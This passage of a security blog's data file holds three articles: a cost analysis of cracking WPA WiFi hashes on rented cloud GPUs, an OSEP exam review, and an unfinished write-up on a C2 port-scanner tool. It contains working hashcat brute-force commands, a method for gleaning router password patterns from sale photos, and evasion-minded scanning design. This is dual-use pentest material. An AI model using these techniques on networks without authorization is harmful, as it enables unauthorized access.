","cost-and-speed-optimisations#Cost and Speed Optimisations":"Math is fun and all but in the end we still want to crack hashes the fastest and cheapest way possible. For this, we need to:\nBenchmark various GPUs and compare them Use our estimated cracking speeds and compare with GPU rental market prices to find the best value offerings Split our workload between different machine instances to increase cracking speed Benchmarking hashcat speed on various GPUs You can find a number of hashcat benchmarks online in gists, github repositories and various other websites. For this example, I’ve rented out 3 machines with NVIDIA RTX GPUs and I’ve ran a hashcat benchmark for each of them:\nmachine #1: Hashcat v7.0.0 benchmark on 5x NVIDIA GeForce RTX 3090 machine #2: Hashcat v7.0.0 benchmark on 7x NVIDIA GeForce RTX 4090 machine #3: Hashcat v7.0.0 benchmark on 2x NVIDIA GeForce RTX 5090 Here are the results:\nThis obviously show that the RTX 5090 is better than the 4090 and 3090 but is it the best value to rent a RTX 5090 vs a 4090/3090?\nFinding the best value GPU market offering To get the most value per each dollar spent, we need to compare the benchmarks we did above with the machine offerings available to us. To do this, I identified the endpoint for querying vast.ai’s machine offering and downloaded those offerings. I then compared the offering with the average hashes per second by GPU type which gives me the machine with the best value opportunity (ie. cheapest per hash crack attempt):\nAs we can see from the table, Offering ID 23752330 is our best choice which is not necessarily the first option in the vast.ai UI:\nvast.ai marketplace listings with best offering selected Obviously, the offerings and prices change over time so you’d need to do this regularly to get a better estimate. Prices in our table are also estimates and may differ slightly vs prices displayed on the site.\nSplitting the workload between multiple instances Once we have rented multiple machines, we’ll want to split our hashcat workload between the different instances. For our optimistic bruteforce use case, we can do it with hashcat’s skip / limit mechanism plus a little scripting so that every machine works on a non-overlapping slice of the keyspace.\nHOSTS=5 # number of hosts K=$(hashcat -m 22000 -a 3 -1 ?u?l?d --keyspace 'FYXME?1?1?1?1?1?1?1?1') # calculating keyspace slice=$(( K / HOSTS )) # number of attempts per host # for each host where i is the host index hashcat -m 22000 hashes.hc22000 -a 3 -1 ?u?l?d FYXME?1?1?1?1?1?1?1?1 -s $((slice * i)) -l $((slice)) Since this is basically just a VPS, there’s already so many tools to split workloads:\nax / axiom / ansible : Tools to help split workloads/commands on a list of servers hashtopolis : web application for distributed password cracking with Hashcat hashcrack-ai : An all in one script to setup and crack passwords on vast.ai GPU instances (not recommend, code is meh) custom: just write your own ssh wrapper… LLMs can basically one shot this. Note\nWhen using interruptible instances, your instance may shut down if someone outbids you. As such, its important to take progress snapshots which can be done easily in hashcat using sessions (--session \u003cfilename\u003e). And restored using the following command: hashcat --session \u003cfilename\u003e --restore","identifying-default-router-password-patterns#Identifying Default Router Password Patterns":"If you have a physical router, simply grab the router and look for the “password” line on the sticker behind it…\nI told you I was dropping INSANE alpha in this post! If you’re a peasant like me and can’t afford the router, don’t worry I’ve got the second best thing for you!\nYou can use your favourite search engine to find images of the router including the magic sticker I mentioned above! Ebay resellers could not care less and will happily take photos of the device’s SSID and Password which means a simple search can already give you an idea about what the password looks like (and if you’re the poor sucker who bought the router from them then your password is already out there):\nGoogle Search for 'Livebox router ebay bottom' Ebay listing for Livebox Router with password visible Note\nI’m using Orange/Livebox as an example not because I want to roast them, but actually because their default passwords are usually pretty decent on these devices! Good job Orange!\nDefining password patterns To be able to identify the password pattern, you may need more then 1 router password (ie. differentiating between alphanumeric and hexadecimals). You can get this trivially by doing a reverse image search on the router sticker you’ve already found as such:\nGoogle Reverse image search for Livebox Router Once you have a few samples, you can define the default password pattern. Using Livebox again as an example, the pattern appears to be the following:\ncharset = uppercase + lowercase + digits charcount = 18 pattern = 18 x charset In plain English, the pattern for Livebox routers is 18 seemingly random alphanumeric characters with uppercase and lowercase letters.\nWe’ll come back to this example later to show why I believe this is a decent default router password.","references#References":"Hashcat benchmarks:\nhttps://gist.github.com/fyxme/8a63bb1a6ff901766f6345acaf135f7e https://gist.github.com/fyxme/bac0a4144d196c779cda545122f1539a https://gist.github.com/fyxme/843b3bc58cd75af62650e99acf18f164 https://gist.github.com/Chick3nman https://www.onlinehashcrack.com/tools-benchmark-hashcat-gtx-1080-ti-1070-ti-rtx-2080-ti-rtx-3090-3080-4090.php GPU provider:\nhttps://cloud.vast.ai/ Datasets:\nRTX 3090/4090/5090 benchmark: https://baserow.io/public/grid/mIZ-q6B0xE6rOT5AgWAeq1eR3aJ49kJZUPTl_7jnw3Q Optimal Cloud GPU Selection: https://baserow.io/public/grid/O2pdJNO__5jHXRic2rEw_dnTizQ9ZPY03GDTTJKrlmM Distributed password cracking applications:\nhttps://fitcrack.fit.vutbr.cz/ https://github.com/hashtopolis/server Other readings:\nhttps://systemoverlord.com/2021/06/05/gpu-accelerated-password-cracking-in-the-cloud.html https://axelum.eu/en/article-gpu-cloud-password-cracking https://github.com/k3nundrum/hashcrack-ai ","using-cloud-gpus-for-password-cracking#Using Cloud GPUs for password cracking":"I’m not going to cover how to do WiFi pentesting, so lets assume we’ve done WiFi testing and have recovered the Access Point’s hash. To emulate this, my friend Kimi K2 wrote a python script to generate a hashcat compatible hash from a given SSID and password:\n# Generating the hash using the script $ python3 wifi_hash_generator.py \"HelloWorld\" \"SpicyPassword123\" | tee hash.txt WPA*01*09cd77f4bf8f32034914268c4980c40e*321bf0d198e4*8a429335416d*48656c6c6f576f726c64*** # Create a wordlist with the password $ echo \"SpicyPassword123\" \u003e wl.txt # Verify that the SSID decodes correctly from the hash $ cat hash.txt | egrep -v \"^$\" | python2 -c \"import sys; print(''.join([l.split('*')[5].decode('hex')+'\\t'+l for l in sys.stdin]))\" HelloWorld\tWPA*01*09cd77f4bf8f32034914268c4980c40e*321bf0d198e4*8a429335416d*48656c6c6f576f726c64*** # Showing the hash can be cracked using hashcat $ hashcat -m 22000 hash.txt wl.txt hashcat (v6.2.6) starting [...redacted for readability...] 09cd77f4bf8f32034914268c4980c40e:321bf0d198e4:8a429335416d:HelloWorld:SpicyPassword123 Session..........: hashcat Status...........: Cracked Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL) Hash.Target......: hash.txt Time.Started.....: Wed Aug 20 05:18:13 2025 (0 secs) Time.Estimated...: Wed Aug 20 05:18:13 2025 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (wl.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 392 H/s (0.55ms) @ Accel:64 Loops:1024 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 1/1 (100.00%) Rejected.........: 0/1 (0.00%) Restore.Point....: 0/1 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: SpicyPassword123 -\u003e SpicyPassword123 Started: Wed Aug 20 05:18:12 2025 Stopped: Wed Aug 20 05:18:15 2025 The above demo shows the hash is valid and can be used with hashcat to emulate a captured WiFi hash.\nFor the next part, we’re going to choose a random password pattern that is definitely not a password pattern used by some ISP in Canada.\nWe’ll use the following password pattern, a fixed string (ie. “FYXME”) followed by 8 random alphanumeric characters:\ncharset = uppercase + lowercase + digits charcount = 8 pattern = \"FYXME\" + 8 x charset Using the script showcased above, we can create a valid hash for our fictitious WiFi Access Point:\n# generating a random password that matches our pattern $ printf 'FYXME%s\\n' \"$(tr -dc 'A-Za-z0-9' \u003c/dev/urandom | head -c 8)\" FYXME0s385dFg $ python3 wifi_hash_generator.py \"FYXME-9999\" \"FYXME0s385dFg\" WPA*01*1096bab4d7f172a4f2016bb0d83cf795*2b37f50e88a7*46f6be6294b2*4659584d452d39393939*** Assuming this was a hash captured via a WiFi capture tool like hcxdumptool or aircrack-ng, we could try to crack the password using the following hashcat command which performs a bruteforce attack with the password mask adjusted for our password pattern:\nhashcat -m 22000 hashes.hc22000 -a 3 -1 ?l?u?d FYXME?1?1?1?1?1?1?1?1 Cracking it offline is fun and all but what if we’re in a hurry and wanted more fire power?\nPassword cracking in the cloud In order to speed up cracking we can either buy really expensive GPUs or make use of the GPU rental markets which have exploded with AI and have driven the prices down significantly!\nI’m using vast.ai[^1] in this case since it has a section for interruptible GPUs (ie. similar to AWS Spot instances) which have lower prices when nobody is using them. This provides good opportunities to find cheap GPUs for research or pentesting purposes.\nA few tips and tricks that I’ve found while using vast.ai’s marketplace:\nYou can enable “interruptible” and “unverified” machines to be showed the lowest prices You can select the docker template you want to deploy on the machine and the templates library includes a Hashcat CUDA template for hashcat v7.0.0 Your credit goes down per minute so if you need it for less than 1 hour, you pay for the number of minutes you used making it potentially incredibly cheap. The interruptible machines market is a bidding system which means you can get outbid by other users vast.ai marketplace 'interruptible' machine listing If you’re lucky, you can find some real gems for example I found the following machine (5x RTX 3090) priced at $0.088/hr:\nvast.ai rented GPU 5x RTX 3090 In the end, its a VPS server so you can just ssh into it and proceed as you please. The UI allows you to set your SSH key for direct access.\nAfter setting up the SSH key, you can connect to your machine and run your hashcat command. In this case, we’re trying to crack the hash we generated previously so I run the following hashcat command:\nhashcat -m 22000 test.hc22000 -a 3 -1 ?l?u?d FYXME?1?1?1?1?1?1?1?1 -O -w4 Even with the firepower of five RTX 3090, this would take about 1 year 92 days to complete which seems like a lot but considering this is only 1 of the many machines we can rent, its really not that long:\nhashcat running on 5x RTX 3090 rented GPU I don’t want to wait 1 year 92 days for this article to come out so we’ll speed it up and use Math to see how much it would cost to crack that hash.\nCalculating cost to crack the hash We can use the hashcat estimates to calculate how much it would cost to crack the hash which ends up being $965 USD (or $482.5 USD on average):\nTime to finish: 1 year 92 days == 457 days == 10968 hours Cost per hour: $0.088 Cost to finish: 0.088 * 10968 ~= $965 Cost to finish on average: 965 / 2 = $482.5 We can also estimate this using the cracking speed and the number of potential passwords based on the password pattern (this will help us later when we look at benchmarking different GPUs):\nCracking speed: 5520.7 kH/s == 5520700 H/s Number of characters in our charset (uppercase + lowercase + digits): 26 + 26 + 10 = 62 Sample space based on our pattern (ie. number of possible passwords): 62 ** 8 = 218340105584896 Number of seconds to exhaust sample space: 218340105584896 / 5520700 ~= 39549351.64 Number of hours to exhaust sample space: 39549351.64 / 3600 ~= 10985.93 Cost to finish: 0.088 * 10985 ~= $967 Cost to finish on average: 967 / 2 = $483.5 Lets assume the monthly cost for our ISP is $62 CAD ($44.69 USD), again a totally random figure that does not represent any actual Canadian ISP. One year of service would cost us about $536.28 USD.\nIf we compare that to the average cost of cracking our generated hash, we find that it is LITERALLY CHEAPER to crack that hash then to pay for 1 year of internet service.\nComparatively, the Livebox (from Orange) would take $405,701,336,942,240,858,112 USD to crack… Might have to ask my grandma for a loan to help with this one…\nNumber of hours to exhaust sample space: 62 ** 18 / 5520700 / 3600 = 9.220484930505475e+21 Cost to finish: 9.220484930505475e+21 * 0.088 = 8.114026738844817e+20 = $811,402,673,884,481,716,224 Cost to finish on average: 8.114026738844817e+20 / 2 = $4.0570133694224086e+20 = $405,701,336,942,240,858,112 811,402,673,884,481,716,224 in words: eight hundred eleven sextillion, four hundred two quintillion, six hundred seventy-three quadrillion, eight hundred eighty-four trillion, four hundred eighty-one billion, seven hundred sixteen million, two hundred twenty-four dollars.\nNow you can understand why I said Orange’s default passwords are usually pretty decent!"},"title":"ISP Default WiFi Passwords Are Costlier to Keep Than to Crack (Value optimised Cloud GPU password cracking)"},"/articles/osep-exam-review/":{"data":{"":"","offsec-osep-exam#Offsec OSEP Exam":"Early December, I attempted the OffSec Experienced Penetration Tester (OSEP) certification exam. I survived a failed computer firmware update, slow and inconsistent internet speeds due to living in a 3rd world country (aka Canada) and a sleeping proctor who took an hour to unfreeze my camera and VPN but in the end…\nI successfully passed the exam! There’s a lot of OSEP reviews out there so I will try to minimise overlap with what overs have said. Use your google fu to find these!\nNevertheless, I’ve compiled a number of tips that will hopefully help you preparing for and taking the OSEP exam.\nPreparation We need to prep for exams? I thought the exam was the prep... Learn to use your tools, especially if you’re using a C2 other than the one taught in the course (ie. Metasploit).\nTJNull has a lot of great suggestions in his OSEP list of vulnerable machines. A lot of these can be used to test your tools in a controlled environment.\nMaking cheatsheets could also be useful especially when you do a lot of these (ie. boot2roots, CTFs or AD environments). Saves you time to just copy paste the commands directly instead of having to run -h / --help every 2 seconds…\nChoice of tools C2 Bazaar\nHavoc quick reference guide\nThe course is centered around Metasploit C2 but use any open source C2 you want and are comfortable with. I used havoc because I wanted to play around with it.\nDon’t be a hero and try to do everything from C2. If you know how to do it from Kali Linux (eg. impacket, netexec, etc) then use that…\nAs long as you have screenshots of retrieving the flag from an interactive shell, you’re gucci.\nAD Enumeration Bazaar\nAD Enumeration quick reference guide\nBloodhound is overrated in these small environments. Plus, the bloodhound client and/or server (depending on which version you are using) is super resource hungry.\nI’d recommend doing manual enumeration using tools like Powerview/powerview.py or adsearch.\nDefence Evasion Important\nYou’re not tested on OPSEC. You can do risky things w/o worrying about OPSEC and whether you should look at less noisy solutions. Just blast things and see what sticks.\nDon’t be scared to disable everything on the environment (eg. firewall, AV, running software), this isn’t production, this isn’t a client’s environment. You’re here to show you understand the vulnerabilities, misconfigurations and can bypass security configurations. If you need to, just revert and if you’re scared add a limitation for the report explaining you did this because you are aware that this is non-production environment and that the “client” (aka offsec) can reset the environment to its original state.\nUse your own time to explore other solutions which do not require disabling defences.\nScreenshot tool Note\nIt’s better to take more then less screenshots… I’d recommend taking fast dirty screenshots, don’t worry about extras and what not, just paste them in your note taking tool like obsidian and reformat them later when writing up the report.\nJust use flameshot, there’s no better alternative.\nYou can also remap your kali and/or host’s machine printscreen button to it.\nMakes your life easier… Simply Screenshot \u003e Edit it from the flameshot popup \u003e Copy \u003e Paste to your favorite editor (eg. Obsidian).\nOther tools You don’t need to do everything from the C2. It’s a free for all, the only requirement is to demonstrate that you have access to the machines in the environment and can reach the flags with an interactive shell, nothing else.\nSo make use of any AD tools you know, including those you can run through proxies (ie. proxychains) like impacket, netexec and powerview.py.\nThe Exam itself Important\nExam completion requirements and tips:\nA total of 100 points (10 points for each proof.txt and/or local.txt flags) OR you reach the end goal and retrieve the secrets.txt file from the target system. Once you reach 100 points, I would focus on ensuring you have all you need for the report (ie. screenshots for the attack paths, valid proof screenshots, notes, etc) and that you have submitted all you flags to the provided control panel. This ensures you don’t forget anything before running out of time. Proof screenshots have a specific format, they need to be taken from an interactive shell and include the (proof|local|secret).txt file contents and the ipconfig of the machine. Also recommended to add whoami in the screenshot because why not (it can help you with write ups later on). You do not need to use a C2 for everything in the exam. The only requirement is that you have screenshots of the flags from an interactive shell. So you can exploit the machine and then drop a beacon on there for example to take your screenshot. Completion txt files :\nproof.txt, local.txt - located on User’s home folder, or other publicly reachable folders. secrets.txt (its the last box on the environment so don’t just count on that to pass… if you’re stuck on one path, check the other paths.) In my opinion, the exam is a lot more straightforward / linear then you think compared to the OSCP.\nTake time to eat/sleep/shower/talk to friends (lol imagine having friends and taking a 3 day proctored exam).\nMake sure to read the OSEP Exam Guide and OSEP Exam FAQ in details before the exam.\nProctoring Caution\nDon’t forget a government issued ID to show to the proctor when the exam starts (don’t do like i did and panic to find any form of government id when they requested it…)\nFor the proctoring tool, I had to disable Wayland on Debian Linux because it was interfering with screen sharing (ie. could only share full screen and not individual screens).\nI lost close to 1 hour at the beginning because of this. I was told that if I could not get the proctoring tools working within the hour, they will end my exam and cancel it (ie. same as did not attend).\nHence, I would highly recommend that you test screen sharing to ensure you can share all your screens individually before the start of the exam. (And install the required extension if you end up using brave or chrome)…\nI ended using brave with the Offsec memory hogging screenshare extension… Now that I’ve read more OSEP reviews, I should have tried with firefox after I fixed my Wayland issue.\nTldr\nUse firefox. If you can only share your full screen and are running linux, it’s probably a Wayland issue (check online for fixes). If that doesn’t work, see if using brave with the screen share plugin works.\nAs with all OSEP exams, don’t worry about crashes (VPN, VM, Computer, Proctoring tool, etc). Just message them in the chat explaining what happened (ie. poor software and/or hardware, shit crashes). They’re usually pretty ok with it. Just restart, reshare and explain what happened.\nIf the proctor is not responding then contact them via this chat. When I had issue and my proctor wasn’t responding for like 1 hour and I needed them to unfreeze the webcam/VPN, I messaged them here and someone answered pretty much straight away and nudged the proctor to respond to me and fix my environment.\nThe dev Windows VM They give you a Windows virtual machine that is configured with all the tools required for writing and compiling c sharp, office macros, etc. Machine has Defender disabled, all the tools you need and has quite a lot of hardware resources.\nIt’s probably the fastest machine in the environment… I recommend to make use of it unless you run your own Windows VM where you can do those kind of things easily. Credentials are on the internal exam control panel.\nThe Exam Report You have 24 hours to finalise and send your report after the exam ends. Make sure you follow the instructions on how to send your report properly (ie. 7z without password, submit on that portal, etc).\nIf you took notes and a lot of screenshots during the exam, this should be a breeze and the formatting should be the most time consuming part.\nI personally used the following offsec exam markdown report template which has some nice report layouts and allows you to take notes in Markdown and generate the final PDF report directly without having to touch MS Word.\nWarning\nWhen installing the Eisvogel latex template with that Offsec Markdown template, don’t use the v2.5 of the Eisvogel latex template because its bugged for images and will not resize/center them properly.\nRef: https://github.com/Wandmalfarbe/pandoc-latex-template/issues/405 Ref2: https://github.com/noraj/OSCP-Exam-Report-Template-Markdown/issues/63\nIf you decide to use that tool, be wary that you may need some bash magic to convert links and other things that might break during conversion. You can look at the Github issues on the repo to look for help but if you’re not confident you can fix the formatting yourself quickly then I wouldn’t recommend it and suggest using the Offsec Word Document instead.\nOnce you’ve submitted the report, you can finally start cleaning up, respond to everyone you ghosted over the past few days and get back to scrolling twitter and watching anime while you wait for Offsec’s email response.\nFamous last words One thing that always amazes me in these long exams is that you can get an insane amount of stuff done, learned and researched in just 48 hours when you disregard all other life distractions and become a hermit.\nProbably not good in the long term but interesting food for thought…\nGood Luck Comrade! "},"title":"OffSec Experienced Penetration Tester (OSEP) Exam Review"},"/articles/replicating-cobalt-strikes-port-scanner-as-a-bof-for-open-source-c2-frameworks/":{"data":{"":"","#":" Tldr\nWas annoyed open source C2 tools had inferior port scanners compared to Cobalt Strike so I decided to replicate the functionality. Also wrote a ping scanner to help with host discovery. OPSEC may still require some improvements as described throughout the blog but the functionality is there. The tool is available here: https://github.com/fyxme/portscanbof\nOn my quest to reviewing random C2’s for pure self enjoyment, I’ve come to realise that very few implement port-scanning for whatever reason.\nWhile I understand that it’s possible to use a socks proxy and perform nmap scans over the proxy using a TCP connect scan (-sT flag), it feels less convenient, generates a lot of unwanted network traffic, requires the beacon to communicate constantly (sleep 0) and may have DNS issues, which made me want to re-create the Cobalt Strike Port Scan functionality.\nIt’s already possible to run binaries (ie. exe and dll) via other BOFs like noconsolation, using dotnet CLR to run csharp binaries inline or using a PowerShell port scanner via the C2’s powershell functionality, however, a lot of these generate more IoCs than BOFs and their output formats don’t integrate as well with C2’s since they were not directly made for those.\nThrough reviewing a number of BOFs on Github, looking at custom C2 agents and more, I didn’t find many implementing portscanning up to the level of Cobalt Strike’s Port Scanner. Although, I will give the following honourable mentions:\nrvrsh3ll’s bofportscan BOF which works well but only supports a single host and a single port Mythic’s thanatos agent which seemed to be the most complete, supports IP and IP subnets as well as ports and port ranges. While the agent itself is really good and the blog post about it deserves a read, this port scan functionality is only available to users of this specific agent, isn’t portable like a BOF, and still doesn’t support as many arguments or output as Cobalt Strike’s port scanner. Hence, the goals were set:\nwrite a portscanner BOF (COFF) that replicates Cobalt Strikes Port Scanning functionality including the wide variety of input parameters and provide the same amount of information as its output write a pingscanner to complement the portscanner and use as a first pass scan have some OPSEC considerations or at least describe the OPSEC limitations of the tool. The initial release will be used to test and improve the BOF in training environments and/or test labs, with future improvement adding functionality and improving OPSEC. We’ll write the BOF in C as it’s the most common language to use for BOFs.\nEnough intro, let’s begin.\nParsing Arguments Cobalt Strike’s port scanner can be using the following way:\nportscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] The [pid] and [arch] options are used to “inject into the specified process to run a port scan against the specified hosts”. We’ll ignore completely as our BOF will just execute within the context of the running agent. Nevertheless, this is a good functionality if you want to improve OPSEC as you may want to choose a process which is likely to perform arbitrary requests to other hosts (eg. a web browser for HTTP/HTTPS). The [targets] option is a comma separated list of hosts to scan. You may also specify IPv4 address ranges (e.g., 192.168.1.128-192.168.2.240, 192.168.1.0/24) The [ports] option is a comma separated list or ports to scan. You may specify port ranges as well (e.g., 1-65535) The [arp|icmp|none] target discovery options dictate how the port scanning tool will determine if a host is alive. none assumes that all hosts are alive. Instead of doing this in the port scan BOF itself, I’ve decided to implement the icmp functionality in a different BOF (ie. pingscan) which will be described later on. The arp scan feature will be implemented as a feature update in a future release. For our portscan, we’ll just assume that all hosts are alive (ie. none) and use timeouts instead to reduce the time it takes to perform a portscan. Lastly, the [max connections] option limits how many connections the port scan tool will attempt at any one time. While this is not hard to code, performing synchronous scans is actually already really fast if you set low enough timeouts (which should be fine considering you’d expect low RTT in most internal environments). Nevertheless, this is a good feature that will be added in a future release. We’ll split our BOF between portscan (ie. TCP connect scan) and pingscan (ie. ICMP echo/reply) with each being used the following way:\nportscan [targets] [ports] pingscan [targets] Parsing ports Parsing ports is relatively easy, there’s only three (3) options:\na single port (eg. 22,445,80, etc) a port range (eg. 1-100, 5000-6000, etc) an arbitrary combination of the two above options separated by a comma (eg. 22,5000-9000,445,7) To improve user experience, we’ll also allow decreasing port ranges (eg. 900-100) for bragging rights on Cobalt Strike’s inferior port scanning argument parser.\nThe pseudo-code for this is simple:\nsplit input on \",\" for each part: if it contains a dash (\"-\") assume its a range: get both parts of the range using sscanf convert each part to an int check that each part is between 1 and 65535 else assume its a port: convert str to int check that the int is between 1 and 65535 Assuming the parts are valid and passed our rudimentary checks, we need to store these ports. A design decision was made to use a linked list to store these as it reduces memory usage when large ranges are provided and easily allows arbitrary combinations to be made. To make things easier, we’ll assume that a single port is the same as the range from that port to itself (ie. \"80\" == \"80-80\"), which allows us to use the following struct:\nParsing targets Parsing targets is a lot more involved since there are many available options, however we can split valid input options between the following input types:\nIP Range: token contains a dash (-). Need to validate that each part of the dash is a valid IP otherwise you might end up matching hosts (eg. asdf-asdf.com). CIDR: that one is easy, just match on /, parse the IP and the mask and do calculations to find the IP range, which brings us back to type 1 Host: you can use getaddrinfo to do the work for you here as it will find IPs for hostnames for you. IP: similarly to hosts, we can use getaddrinfo and validate the IP which allows us to treat single IPs, the same way as single Hosts. A combination of any of the above input types, split by a comma (,) In the end, you can categorise each target into one of two categories:\nIP Range: IP ranges, and CIDR Subnet (ie. an IP range in disguise) IP/Host: Everything else that was parsed correctly by getaddrinfo Similarly to port arguments, we’ll use a linked list to store the information as it provides the most flexibility. This results in the following struct definitions:\nImportant\nOPSEC: The getaddrinfo function returns results for the NS_DNS namespace. The getaddrinfo function aggregates all responses if more than one namespace provider returns information. For use with the IPv6 and IPv4 protocol, name resolution can be by the Domain Name System (DNS), a local hosts file, or by other naming mechanisms for the NS_DNS namespace. (ref)\nie. getaddrinfo will resolve host names to their IPs. This potentially results in network traffic being generating while parsing input. To limit network traffic, we store a pointer to the addrinfo struct populated after running getaddrinfo and we’ll reuse it during scanning operations.\nCorrect parsing results in the following (with reversible IP ranges to assert dominance on Cobalt Strike’s inferior parser):\nICMP (ping scan) Windows API provides a very easy to use function to send ICMP echo requests, namely IcmpSendEcho. We can use this function to send ICMP echoes to our targets easily:\n// The **IcmpSendEcho** function sends an IPv4 ICMP echo request and returns any echo response replies. The call returns when the time-out has expired or the reply buffer is filled. IPHLPAPI_DLL_LINKAGE DWORD IcmpSendEcho( [in] HANDLE IcmpHandle, [in] IPAddr DestinationAddress, [in] LPVOID RequestData, [in] WORD RequestSize, [in, optional] PIP_OPTION_INFORMATION RequestOptions, [out] LPVOID ReplyBuffer, [in] DWORD ReplySize, [in] DWORD Timeout ); The function takes in a HANDLE IcmpHandle as its first parameter which denotes a handle returned by the IcmpCreateFile function (ie. a “function which opens a handle on which IPv4 ICMP echo requests can be issued.”). From testing, it appears we can reuse this file allowing us to create the initial handle and reuse it on subsequent calls to IcmpSendEcho resulting in improved scanning speed.\nOPSEC I wanted to see the network traffic difference between the IcmpSendEcho default configuration and the traffic generated from the ping.exe Windows utility. As it turns out, there is quite a bit of a difference:\nWe notice the following from the screenshot above:\nping.exe: the ICMP requests and replies from the first four packets (those generated by the ping utility) are all 74 bytes long. The packet’s time to live (ie. ttl) is set to 128ms. IcmpSendEcho: the request packets are 46 bytes long and the reply packets are 60 bytes long. The packet’s TTL defaults to 255ms. By comparing the requests packets, we notice that the ping utility sends data as part of the request, namely the following string abcdefghijklmnopqrstuvwabdcefghi.\nWe can match this in our function call by passing in RequestData, and adjust the packet’s TTL to 128ms. This results in the following traffic being generated which is now identical between both ping.exe and our ping scanner:\nNote\nThe ping reply size difference was simply due to the difference in data being sent (since the reply contains the data our packet has sent), hence no further configuration was needed.\nWith configurations and optimisations via timeout, this results in the following code:\nDanger\nOPSEC: Other than the improvements described above, the tool does not currently add any delay between ping requests which can result in extremely fast consecutive requests being made which could lead to Denial of Service (DoS) on fragile hosts/environments if you’re not careful. Further customisation options will added in a future release to help improve OPSEC, as well as the ability to configure a custom timeout. The defaults will be adjusted to ping.exe’s timeouts.\nWe can combine this with the parser to have a working pingscanner that supports many input types:\nSpeed Surprisingly if you don’t add a delay between the ping requests, it’s actually extremely fast… Who knew…\nWithout multi-threading or any other optimisations, running it against a /24 subnet (ie. 255 IPs) with low response times, you can scan the whole subnet in about 4 seconds: Just watch out… If you ping scan too quickly, you get angry neighbours… From ~20ms to over 10 times that for each ping:\nFrom testing, it appears there are two events which can slow down the ping scan:\nA ping request timeout which results in error 11010 aka IP_REQ_TIMED_OUT. This is possible to optimise by setting the request timeout in IcmpSendEcho, although there is a trade-off where you may end up with false negatives (ie. the host exists but took longer than timeout time to respond). Supplying non existant domains will result in delay from getaddrinfo. Unfortunately, it doesn’t have a timeout so you’d need to run it in a thread and time it out yourself if you wanted to optimise this. Or implement DNS requests yourself, but I’ll leave that as an exercise for the reader. Furthermore, getaddrinfo is also extremely slow when provided with invalid input… A stunning 2.4s to say that the host doesn’t exist: The simplest fix to the above would be to check whether the input is a valid IP or hostname based on a regex, although this is harder than expected because in an internal environment, pretty much anything could be a valid hostname….\nOPSEC wise performing a scan this fast really isn’t great and will start flooding the network with too many packets, potentially generating alerts or breaking stuff. But damn it’s fun to see the packets go by at MACH 2 speed!\nI’ll add IP/Host validation as an optimisation in the backlog, move on to another project and never implement it. But at least you know its there… So yeah, don’t pass stupid data to it and you should be sweet!\nTCP (port scan) Before attempting to write a port scanner, I looked at the video linked on Cobalt Strike’s website about the Port Scanning functionality. From this, I gathered a few things I wanted to include in this port scanner:\nThe port scanner shows all open ports (that’s an obvious one) For each port/service it finds, if the service supplies a banner (ie. SSH), then it will receive the banner and display it The scanner provides additional information for Windows hosts with SMB open (port 445) This is the functionality I wanted to replicate with this BOF.\nPort Scan Function Note\nThis is describing a TCP Connect Scan. If you are interested in other types of scans, checkout nmap’s book on scan methods.\nPort scanning in itself is very simple, you have an IP and a port, you connect to an address, if the socket connects successfully, that port is open, if the socket errors that port is closed. Translate to code, this looks something like this (assuming WSA is initialised outside of this function):\nNot much going on here but this would also make a terrible port scanner because it would be terribly slow when you try to scan a port/service that doesn’t exist (ie. you’d get timed out but it would take a while). The screenshot below demonstrates this. It’s pretty much instant when the service exists (Elapsed time: 0.00 seconds) but takes forever when the services do not respond (Elapsed time: 42.00 seconds):\nTo improve the speed we can set a timeout when the socket attempts to connect to the remote port/service. On Windows, this results to setting the socket to non-blocking mode and using the select function to wait for the socket to successfully connect or timeout. This allows us to set a socket timeout and greatly increase the speed of the program:\nThe code above results in an increase of 41 seconds over the old code:\nLastly, since we want to receive the headers from sockets we successfully connect to, we should set a timeout on the socket receive too. We can do this using the setsocketopt function prior to connecting to the socket as such:\nThis is pretty much it in terms of basic setup and allows us to identify open ports at a reasonable speed. We can now move on to more fun stuff like receive service headers and querying Windows Host information.\nService Headers and Information Discovery In the video posted on the Cobalt Strike website, they show banner information retrieved when port scanning:\nNow, the simple headers like SSH are simply sent upon connecting to the service. You just need to receive after connecting to the socket. You don’t even need to send any data:\nThis is trivial to add to our scanner using the following snippet:\nNote: In the above snippet, we are setting the socket back to blocking mode, however if we wanted to keep it asynchronous we could use a similar approach as what we did for connect, check the WSA Error and use select to wait for the recv function to end or timeout.\nI knew you could get computer information from SMB such as hostname and domain but I’ve never had to implement it in code so I wasn’t sure where to get it from. The computer information seemed harder to get from SMB and I thought surely you wouldn’t get that from simply connecting to the socket. Spoiler alert, you don’t…\nSo I went down the rabbit hole and found some documentation on how to get server information on MS Documentation. I started by using NetServerGetInfo to try and retrieve the same information as in the cobalt strike clip… Turns out it was not that…. I didn’t get much information from it but was on the right track:\nDid more digging and found another more promising function, namely NetWkstaGetInfo. And as it turns out, it looks like this is what they are using under the hood. I was able to get the exact same information as Cobalt Strike’s port scanner from that one function call:\nNote\nYou can request different levels of information from both NetWkstaGetInfo and NetServerGetInfo.\nExample for NetWkstaGetInfo:\nAnonymous access is always permitted for level 100. Authenticated users can view additional information at level 101 Members of the Administrators, and the Server, System and Print Operator local groups can view information at levels 102. We’re using level 100 here since we want to do this unauthenticated.\nAll that remained was adding the following code to our scanner:\nFinal Scanner After implementing all of the above, we have a scanner that can identify open ports, prints Windows host information and displays service banners:\nHowever, it’s not a BOF yet…\nOPSEC At the moment the tool scans all selected ports on one (1) IP before moving on to the next, however it might be better to do the opposite and scan one (1) port on all IPs and move on to the next port.\nAn even better solution might be to randomly choose 1 port and 1 IP and scan that, although if you see random ports and IPs popping up in logs than it also might stand out as weird… More research required.\nInterestingly, looking at the output from Cobalt Strike’s video demonstrating their port scanner, I noticed two things:\nThey are scanning IPs and ports from highest to lowest (probably due to how they are parsing the arguments). You can see the first service to come back is port 5357 on 10.10.10.2222: And after the video cut, you can see the IPs are decreasing and ports too:\nThey perform the NetWkstaGetInfo on all hosts with port 445 open at the end of the scan, which is why you see all of the port 445 hosts popup at once: No idea if their design is better or not. Need to test it inside a lab environment where monitoring tools are in place to gain a better idea. Good follow up research!\nConverting to a BOF A follow up blog will be 